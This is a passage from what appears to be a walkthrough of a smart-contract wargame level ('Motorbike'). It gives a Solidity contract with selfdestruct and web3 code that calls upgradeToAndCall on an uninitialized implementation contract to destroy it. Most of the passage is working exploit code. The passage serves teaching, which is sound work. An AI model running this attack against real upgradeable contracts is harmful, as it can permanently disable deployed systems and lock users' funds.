4. So, player is now eligible to upgrade the implementation contract now through upgradeToAndCall method. Let's create the following malicious contract - BombEngine in Remix:
```
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract BombEngine {
    function explode() public {
        selfdestruct(address(0));
    }
}
```
5. Deploy BombEngine (on same network) and copy it's address. If we set the new implementation through upgradeToAndCall, passing BombEngine address and encoding of it's explode method as params, the existing Engine would destroy itself. This is because _upgradeToAndCall delegates a call to the given new implementation address with provided data param. And since delegatecall is context preserving, the selfdestruct of explode method would run in context of Engine. Thus Engine is destroyed. Upgrade Engine to BombEngine. First set up function data of upgradeToAndCall to call at implAddress:
```
bombAddr = '<BombEngine-instance-address>'
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAddr, explodeData]

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
```
6. Now call upgradeToAndCall at implAddr:
```
await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
```
Boom! The Engine is destroyed! The Motorbike is now useless. Motorbike cannot even be repaired now because all the upgrade logic was in the logic contract which is now destroyed.

